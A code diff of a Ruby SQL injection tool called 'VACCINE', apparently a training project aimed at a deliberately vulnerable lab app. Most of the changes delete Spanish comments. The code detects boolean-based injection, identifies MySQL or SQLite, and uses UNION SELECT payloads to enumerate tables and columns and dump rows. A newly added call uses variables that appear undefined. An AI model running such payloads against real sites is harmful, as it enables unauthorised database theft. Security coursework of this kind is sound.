@@ -72,7 +72,6 @@ def make_request(url, request, params)
   elsif request.upcase == "POST"
     req = Net::HTTP::Post.new(uri.path.empty? ? "/" : uri.path)
     req.set_form_data(params)
-   # req["Content-Type"] = "application/x-www-form-urlencoded" # ESTA LÍNEA ES CLAVE
   else 
     puts "[VACCINE] request type not suported"
     return nil
@@ -80,10 +79,9 @@ def make_request(url, request, params)
   req["Cookie"] = "PHPSESSID=c131r7vsgpj4iu22m5rmljpce0; security=low"
   req["User-Agent"] = "Mozilla/5.0"
 
-  # Enviamos la petición y capturamos la respuesta sin filtrar por 'success'
     res = http.request(req)
     if res
-      return res # Devolvemos el objeto respuesta completo (sea 200, 302, 404 o 500)
+      return res 
     end
     puts "[VACCINE] connection failed"
     exit 1 
@@ -93,14 +91,13 @@ def get_base_params(url)
   begin
     uri = URI.parse(url)
     if uri.query
-      # Esto transforma "artist=1&id=2" en {"artist" => "1", "id" => "2"}
       return URI.decode_www_form(uri.query).to_h
     else
       return { "id" => "1" } 
     end
   rescue URI::InvalidURIError
     puts "[VACCINE] Invalid url."
-    exit 1 # O return nil y gestionarlo fuera
+    exit 1 
   end
 end
 
@@ -122,7 +119,6 @@ def save_to_yaml(path, target_url, method, parameter, payload, engine, data_dump
     }
   }
 
-  # Escribir al archivo (modo 'a' para no borrar lo anterior o 'w' para sobrescribir)
   File.open(path, "w") do |file|
     file.write(report.to_yaml)
   end
@@ -147,7 +143,6 @@ def extract_info(target_param, base_params, url, request, engine)
   end
   return nil if col_count <= 0
 
-  # 2. COLUMNA VISIBLE (¿Dónde inyectamos?)
   test_cols = (1..col_count).map { |n| (n * 111).to_s } 
   payload_union = "1' UNION SELECT #{test_cols.join(',')}-- "
   res_union = make_request(url, request, base_params.merge({ target_param => payload_union }))
@@ -156,7 +151,6 @@ def extract_info(target_param, base_params, url, request, engine)
   test_cols.each_with_index { |val, idx| (visible_idx = idx; break) if res_union.body.include?(val) }
   return nil unless visible_idx
 
-  # 3. EXTRACCIÓN DE TABLAS
   payload_array = Array.new(col_count, "NULL")
   if engine == "SQLite"
     payload_array[visible_idx] = "group_concat(tbl_name)"
@@ -170,12 +164,10 @@ def extract_info(target_param, base_params, url, request, engine)
   raw_tables = res_tables.body.scan(/First name: (.*?)</).flatten
   tablas = raw_tables.reject { |s| s.downcase.include?("html") || s.strip.empty? }.first&.split(',') || []
 
-  # 4. EXTRACCIÓN DE COLUMNAS (De la primera tabla que encontremos, ej: 'users' o 'admin')
   columnas = []
   if tablas.any?
     target_table = tablas.include?("users") ? "users" : tablas.first
     if engine == "SQLite"
-      # En SQLite es más fácil sacar el SQL de creación y parsearlo
       payload_array[visible_idx] = "sql"
       from_cols = "FROM sqlite_master WHERE tbl_name='#{target_table}'"
     else
@@ -187,17 +179,13 @@ def extract_info(target_param, base_params, url, request, engine)
     raw_cols = res_cols.body.scan(/First name: (.*?)</).flatten
     columnas = raw_cols.reject { |s| s.downcase.include?("html") || s.strip.empty? }.first&.split(',') || []
   end
-  # 5. EXTRACCIÓN DE FILAS (DUMP REAL)
   #
   raw_cols = res_cols.body.scan(/First name: (.*?)</).flatten.first
   final_rows = "No data found"
   if engine == "SQLite"
     if raw_cols
-      # Quitamos todo lo que hay hasta el primer paréntesis
       limpio = raw_cols.gsub(/.*?\(/, "").gsub(/\).*/, "") 
 
-      # Separamos por comas y para cada trozo, nos quedamos solo con la primera palabra
-      # (Ej: "user TEXT" -> "user")
       columnas = limpio.split(',').map { |c| c.strip.split(' ').first }
     end
   end
@@ -208,7 +196,6 @@ def extract_info(target_param, base_params, url, request, engine)
     c1 = columnas[0]
     c2 = columnas[1] || columnas[0]
 
-    # Payload: UNION SELECT concat(col1, ':', col2), NULL FROM tabla
     if engine == "SQLite"
     data_payload = "group_concat(#{c1} || ':' || #{c2})"
   else
@@ -220,9 +207,6 @@ def extract_info(target_param, base_params, url, request, engine)
     raw_data = res_data.body.scan(/First name: (.*?)</).flatten
     final_rows = raw_data.reject { |s| s.downcase.include?("html") || s.strip.empty? }.first || "No data found"
   end
-
-
-  
 
   { tables: tablas, columns: columnas, data: final_rows }
 end
@@ -237,7 +221,6 @@ if original_res.code != "200"
 end
 
   base_params.each do |key, value|
-    # 1. TEST DE VULNERABILIDAD
     current_payload = "#{value}#{PAYLOADS[:mysql][:boolean_false]}"
     attack_params = base_params.dup
     attack_params[key] = current_payload
@@ -245,8 +228,6 @@ end
     attack_res = make_request(url, request, attack_params)
     next unless attack_res
 
-    # Si el tamaño cambia, hay inyección
-    # esto cambiarlo
     if attack_res.body.to_s.length != original_res.body.to_s.length
       puts "[VACCINE] VULNERABILITY DETECTED WITH BOOLEAN ATTACK on parameter: #{key}"
 
@@ -261,23 +242,13 @@ end
       diff_mysql = (mysql_res.body.length - original_res.body.length).abs
       diff_sqlite = (sqlite_res.body.length - original_res.body.length).abs
 
-      #ojo con esto
       if sqlite_res.body.include?("First name:")
         engine = "SQLite"
-        # Si es MySQL, lo mismo
       elsif mysql_res.body.include?("First name:")
         engine = "MySQL"
       else
         engine = "Unknown"
       end
-      # if mysql_res && diff_mysql < 50 
-      #   engine = "MySQL"
-      # elsif sqlite_res && diff_sqlite < 50
-      #   engine = "SQLite"
-      # else
-      #   engine = "Unknown"
-      # end
-      #
       puts "[VACCINE] Motor detected: #{engine}"
       next if engine == "Unknown"
       data = extract_info(key, base_params, url, request, engine)
@@ -307,7 +278,14 @@ def main
 
   conf = Config.new(url)
   parse_input(input, conf)
+  # Aquí va tu lógica de vaccine
+  begin
   res = vaccine(conf.url, conf.path, conf.request)
+  vaccine(url, method, output)
+  rescue Errno::ECONNREFUSED
+  puts "[VACCINE] server #{url} response failed"
+  exit 1
+  end
 end
 
 if __FILE__ == $0
